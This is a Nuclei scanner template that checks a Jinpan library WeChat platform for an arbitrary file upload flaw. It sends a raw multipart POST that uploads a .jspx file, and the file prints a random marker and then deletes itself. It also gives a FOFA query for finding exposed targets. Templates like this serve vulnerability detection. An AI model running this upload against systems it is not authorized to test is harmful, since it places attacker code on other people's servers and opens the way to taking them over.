id: goldlib-library-fileupload
info:
  name: 金盘图书馆微信管理平台 /common/upload/upload - fileupload
  author: leadlife
  severity: critical
  description: 金盘图书馆微信管理平台 /common/upload/upload 接口存在任意文件上传漏洞，攻击者通过漏洞可以获取权限。
  reference: 
    - https://github.com/wy876/POC/blob/main/%E9%87%91%E7%9B%98/%E9%87%91%E7%9B%98%E7%A7%BB%E5%8A%A8%E5%9B%BE%E4%B9%A6%E9%A6%86%E7%B3%BB%E7%BB%9Fupload%E5%AD%98%E5%9C%A8%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E.md
  classification:
    cve-id: 
  metadata:
    verified: true
    fofa-query: app="金盘软件-金盘移动图书馆系统"
  tags: goldlib,fileupload

variables:
    filename: "{{to_lower(rand_base(4))}}"
    date: '{{date_time("%Y%M%D%H%M%S")}}'

http:
  - raw:
      - |
        POST /common/upload/upload HTTP/1.1
        Host: {{Hostname}}
        Cache-Control: max-age=0
        Upgrade-Insecure-Requests: 1
        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36
        Content-Type: multipart/form-data; boundary=399e563f0389566bd40fd4d6409a67dd
        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
        Accept-Encoding: gzip, deflate
        Accept-Language: zh-CN,zh;q=0.9,ru;q=0.8,en;q=0.7
        Cookie: JSESSIONID=D8C7BD39FAF4DD095FBBB0E87FB017C5
        Connection: close
        Content-Length: 179

        --399e563f0389566bd40fd4d6409a67dd
        Content-Disposition: form-data; name="file"; filename="{{filename}}.jspx"

        <%out.print("{{randstr}}");new java.io.File(application.getRealPath(request.getServletPath())).delete();%>
        --399e563f0389566bd40fd4d6409a67dd--
        
    matchers:
      - type: dsl
        dsl:
          - status_code == 200
          - contains_all(body,'fileName','{{filename}}','jspx')
        condition: and